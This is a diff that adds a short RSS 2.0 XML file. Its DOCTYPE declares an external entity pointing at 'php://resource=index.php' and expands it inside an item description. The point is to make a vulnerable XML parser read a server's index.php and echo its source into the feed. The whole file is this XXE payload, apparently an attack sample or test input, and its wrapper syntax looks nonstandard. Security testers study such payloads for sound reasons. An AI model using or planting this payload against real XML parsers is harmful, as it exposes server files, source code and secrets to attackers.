@@ -1,0 +1,23 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE rss [
+    <!ELEMENT rss (channel)>
+    <!ATTLIST rss version CDATA #REQUIRED>
+    <!ELEMENT channel (title, link, description, item*)>
+    <!ELEMENT title (#PCDATA)>
+    <!ELEMENT link (#PCDATA)>
+    <!ELEMENT description (#PCDATA)>
+    <!ELEMENT item (title, link, description)>
+    <!ENTITY file SYSTEM "php://resource=index.php">
+]>
+<rss version="2.0">
+    <channel>
+        <title>Index PHP Content</title>
+        <link>https://www.example.com</link>
+        <description>Content of the index.php file included via external entity.</description>
+        <item>
+            <title>Index.php Content</title>
+            <link>https://www.example.com/index.php</link>
+            <description>&file;</description>
+        </item>
+    </channel>
+</rss>
